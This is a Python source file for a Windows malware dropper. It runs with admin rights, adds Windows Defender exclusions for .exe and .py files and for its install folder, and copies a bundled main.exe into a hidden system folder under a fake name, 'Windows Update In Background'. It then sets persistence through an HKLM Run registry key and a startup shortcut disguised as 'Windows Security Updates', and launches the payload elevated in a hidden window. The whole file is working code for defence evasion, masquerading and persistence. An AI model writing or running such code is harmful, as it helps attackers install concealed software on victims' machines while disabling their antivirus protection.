print("start")

import ctypes
import random
import os
import time
import winreg
import random
import shutil
import sys
import subprocess
from win32com.client import Dispatch
print("Everything imported.\ndefining functions")

winpath = os.environ.get("SystemRoot")
fake_folder_names = ['CD', "AllLogs", "Drivers", "Config", "Integration", "Extensions", "Cloud", "IoT", "Settings", "Cache", "3D", "x32", "Power", "Windows", "TempDatas", "x86"]
secretname="GJ2A3"

def is_installed():
    path_of_luck = os.path.join(winpath,"Systematic Luck.bak")
    if not os.path.exists(path_of_luck):
        print("Fresh installation")
        
        return False
    print("Reading luck...")
    file = open(path_of_luck,'r')
    path_readed = file.read().strip()
    file.close()
    print("Path:",path_readed)
    splitted = path_readed.split('\\')
    print("Splitted")
    temp = str(splitted[0])
    for i in range(1,len(splitted)-1):
        temp = os.path.join(temp,str(splitted[i]))
    print("temp:",temp)
    exec_name=path_readed.split('\\')[-1][:-4]
    print("Executable detected:", exec_name)
    del_reg(exec_name)
    print("Stopping process...")
    os.system('TASKKILL /F /IM "'+exec_name+'.exe" /T')
    os.system("del \""+path_of_luck+'"')
    os.system("del \""+path_readed+'"')
    os.system("del \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Windows Security Updates.lnk\"")
    print(temp)
    os.system("rmdir "+temp+" /s /q")
    print('\nReturning to standard installation\n\n\n')
def set_startup_registry(name:str, path_to_the_executable:str,REG_PATH:str=r'Software\Microsoft\Windows\CurrentVersion\Run')->bool:
    try:
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0,  winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, path_to_the_executable)
        winreg.CloseKey(registry_key)
        return True
    except:
        return False
def del_reg(name:str,REG_PATH:str=r'Software\Microsoft\Windows\CurrentVersion\Run')->bool:
    try:
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0,  winreg.KEY_WRITE)
        winreg.DeleteValue(registry_key, name)
        winreg.CloseKey(registry_key)
        return True
    except:
        return False
def get_random_text_for_reg(length:int=20,string_set:list[str]=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])-> str:
    if length==5:
        return secretname
    elif length<5:
        Error=ValueError(length)
        Error.add_note(Error,"5 or bigger integer is required")
        raise Error
    j=''
    b=random.choice(range(length-len(secretname)+1))
    for i in range(b):
        j+=random.choice(string_set)
        random.randrange(0,1)
    j+=secretname
    for i in range(length-len(secretname)-b):
        j+=random.choice(string_set)
    return j
def get_suitable_location() -> str:
    global foldername
    foldername = random.choice(fake_folder_names)
    location = os.path.join(winpath, foldername)
    return location
def save_the_location(location:str,name_of_file:str = "Systematic Luck.bak"):
    file = open(os.path.join(winpath,name_of_file),'w')
    file.write(location)
def get_main_file_location() -> str:
    if getattr(sys, 'frozen', False):  # Check if running as a frozen executable
        data_dir = sys._MEIPASS
    else:
        data_dir = os.path.dirname(__file__)  # Use current directory when running normally
    return os.path.join(data_dir,'main.exe')
def rename_and_move_main_file(from_path:str, folder, to_path:str):
    try:
        os.mkdir(os.path.join(winpath,folder))
    except:
        print("Folder already excists:",os.path.join(winpath,folder))
    shutil.copy(from_path,to_path)
    os.system(f'attrib +s +h "{to_path}"')
    os.system(f'attrib +s +h "{os.path.join(winpath,folder)}"')
def run(path:str,folder:str):
    ctypes.windll.shell32.ShellExecuteW(
        None,  # No parent window handle
        "runas",  # Elevated privileges
        path,  # Path to the app
        "",  # No arguments
        folder,  # Working directory
        0  # Hidden window
    )
def add_exclusions(*extensions):
    """Adds exclusions for specified extensions to Windows Defender.

    Checks if exclusions already exist before attempting to add them.

    Args:
        extensions: A list of file extensions to exclude.
    """

    for extension in extensions:
        exclusion_exists = check_exclusion_exists(extension)
        if not exclusion_exists:
            add_exclusion_command = f"powershell.exe Add-MpPreference -ExclusionExtension \"{extension}\""
            try:
                subprocess.run(add_exclusion_command, check=True)  # Use subprocess for better control
                print(f"Exclusion added for extension: {extension}")
            except subprocess.CalledProcessError as e:
                print(f"Error adding exclusion for {extension}: {e}")
        else:
            print(f"Exclusion for {extension} already exists.")
def add_folder_exclusion(extension):
    add_exclusion_command = f"powershell.exe Add-MpPreference -ExclusionPath \"{extension}\""
    try:
        subprocess.run(add_exclusion_command, check=True)  # Use subprocess for better control
        print(f"Exclusion added: {extension}")
    except subprocess.CalledProcessError as e:
        print(f"Error adding exclusion for {extension}: {e}")
def check_exclusion_exists(extension):
    """Checks if an exclusion for the given extension already exists."""

    check_exclusion_command = f"powershell.exe Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension"
    result = subprocess.run(check_exclusion_command, capture_output=True, text=True)
    exclusions = result.stdout.split(",")
    return extension in exclusions
def create_shotcut(target:str,
                   working_dir:str,
                   location_of_shotcut:str = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"):
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(os.path.join(location_of_shotcut, "Windows Security Updates.lnk"))
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = working_dir
    shortcut.IconLocation = target
    shortcut.save()

print("Checking admin privilages...")
is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
foldername=''
if is_admin:
    try:
        print("\n\nIs admin.\n\n\n\n")
        print("Disabling Defender...")
        add_exclusions(".exe", ".py")
        is_installed()
        random_name = get_random_text_for_reg(int(random.random()*15)+5)
        name = "Windows Update In Background ("+random_name+")"
        print("\nName:",name)
        path = get_suitable_location()
        print("Adding FOLDER exclusion...")
        add_folder_exclusion(path)
        print(f"Path: {path}")
        main_location = os.path.join(path, f"{name}.exe")
        print("Main location:",main_location)
        print('Moving main file...')
        current_location_of_main=get_main_file_location()
        rename_and_move_main_file(current_location_of_main, foldername, main_location)
        print("Location saving...")
        save_the_location(main_location)
        print("Setting startup registry...")
        set_startup_registry(name, main_location)
        print("Creating shortcut at startup folder...")
        create_shotcut(main_location,path)
        print("Running...")
        run(main_location,path)
        
        print("DONE")
    except Exception as e:
        print(e)
    os.system("pause")
else:
    print('\n'*100,"NOT ADMIN")
    print('\n'*5)
    t_end = time.time_ns()/1000000 + 3000
    while True:
        t_remaining = round(t_end - time.time_ns()/1000000,2)
        if t_remaining<0:
            sys.exit(1223)
        print(f"Waiting {t_remaining}ms before exiting"+'['+int(t_remaining/100)*'.'+(15-int(t_remaining/100))*' '+']',end='\r')
        time.sleep(0.1)